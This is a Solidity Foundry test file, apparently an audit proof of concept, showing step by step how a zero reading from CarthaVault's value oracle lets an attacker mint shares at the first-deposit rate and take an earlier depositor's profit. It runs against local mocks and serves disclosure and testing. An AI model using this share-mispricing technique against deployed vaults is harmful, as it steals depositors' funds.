// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {CarthaVaultPoolTest} from "./vault/CarthaVaultPool.t.sol";
import {CarthaVault} from "../src/CarthaVault.sol";
import {Mock0xMReader} from "./mocks/Mock0xMReader.sol";
import {Mock0xMOracle} from "./mocks/Mock0xMOracle.sol";
import {I0xMReader} from "../src/interfaces/I0xMReader.sol";

/// @title PoC (lead #1): stale-TVL share mispricing -> PnL theft
/// @notice CarthaVault._convertToShares treats `totalAssets()==0 && totalSupply>0` as a FIRST deposit (1e12-offset
/// rate) instead of using the live share price. If a child's idle USDC is fully deployed to 0xM and the GM oracle
/// transiently returns gmPrice<=0 (PoolDeployLib.gmValueInUsdc then returns 0 => TVL reads 0) while real, profitable
/// GM value exists, an attacker deposits at the stale first-deposit rate and, after the oracle recovers, owns a slice
/// of existing holders' PnL. Demonstrated with the repo's own mocks.
contract PoC_StaleTvlMint is CarthaVaultPoolTest {
    Mock0xMReader reader;
    Mock0xMOracle oracle;
    CarthaVault cv;

    function _wireOracle() internal {
        cv = CarthaVault(address(vault));
        reader = new Mock0xMReader();
        oracle = new Mock0xMOracle();
        vm.startPrank(admin);
        cv.setReader(address(reader));
        cv.setDataStore(address(reader)); // any non-zero
        cv.setOracle(address(oracle));
        vm.stopPrank();
        // market props: tokens unset -> mock oracle returns zero PriceProps; mock reader ignores them.
        reader.setMarket(I0xMReader.MarketProps(address(0), address(0), address(0), address(0)));
    }

    function _setGmValue(uint256 usdcValue) internal {
        // gmValueInUsdc = gmBalance * price / 1e30  =>  price = usdcValue * 1e30 / gmBalance
        uint256 gmBal = gmToken.balanceOf(address(vault));
        require(gmBal > 0, "no gm");
        reader.setMarketTokenPrice(int256((usdcValue * 1e30) / gmBal));
    }

    function test_PoC_staleTvlZeroRead_stealsPnL() public {
        _wireOracle();
        uint64 lockDays = 1;
        uint256 D = 100_000e6; // >= MIN_LOCK

        // --- Victim deposits 100k USDC, keeper deploys it all to 0xM (idle -> 0) ---
        _depositAndLock(user1, D, lockDays);
        _deployToPool(D);
        assertEq(usdc.balanceOf(address(vault)), 0, "idle drained to pool");

        // Positive PnL: the GM position is now worth 150k USDC.
        _setGmValue(150_000e6);
        assertEq(cv.totalValueLocked(), 150_000e6, "TVL reflects 150k GM value (+50% PnL)");
        uint256 victimShares = cv.balanceOf(user1);
        uint256 victimClaimBefore = (victimShares * cv.totalValueLocked()) / cv.totalSupply();
        assertEq(victimClaimBefore, 150_000e6, "victim alone is worth 150k before the attack");

        // --- Oracle glitch: GM price reads <= 0 => gmValueInUsdc == 0 => TVL reads 0 (supply still > 0) ---
        reader.setMarketTokenPrice(0);
        assertEq(cv.totalValueLocked(), 0, "TVL falsely reads 0 while real GM value exists");

        // --- Attacker deposits 100k USDC during the zero-read window: minted at the 1e12 first-deposit rate ---
        _depositAndLock(user2, D, lockDays);
        uint256 attackerShares = cv.balanceOf(user2);
        assertEq(attackerShares, D * 1e12, "attacker minted at stale FIRST-deposit rate (1e12 offset)");
        // (a correctly-priced deposit at 150k TVL / 150k*1e12 supply would mint only ~0.667 * D * 1e12)

        // --- Oracle recovers: TVL = 150k GM + 100k attacker idle = 250k ---
        _setGmValue(150_000e6);
        assertEq(cv.totalValueLocked(), 250_000e6, "TVL = 150k GM + 100k attacker idle");

        // --- Accounting proof: attacker claims MORE than deposited; victim's PnL was stolen ---
        uint256 attackerClaim = (attackerShares * cv.totalValueLocked()) / cv.totalSupply();
        uint256 victimClaim = (victimShares * cv.totalValueLocked()) / cv.totalSupply();
        assertEq(attackerClaim, 125_000e6, "attacker can claim 125k for a 100k deposit (+25k)");
        assertEq(victimClaim, 125_000e6, "victim dropped from 150k to 125k (-25k stolen)");
        assertGt(attackerClaim, D, "BUG: attacker profits purely from the stale-rate mint");
        assertLt(victimClaim, victimClaimBefore, "victim PnL diluted by the attacker's cheap shares");

        emit log_named_uint("attacker deposited (USDC)", D / 1e6);
        emit log_named_uint("attacker claim       (USDC)", attackerClaim / 1e6);
        emit log_named_uint("victim before        (USDC)", victimClaimBefore / 1e6);
        emit log_named_uint("victim after         (USDC)", victimClaim / 1e6);
    }
}
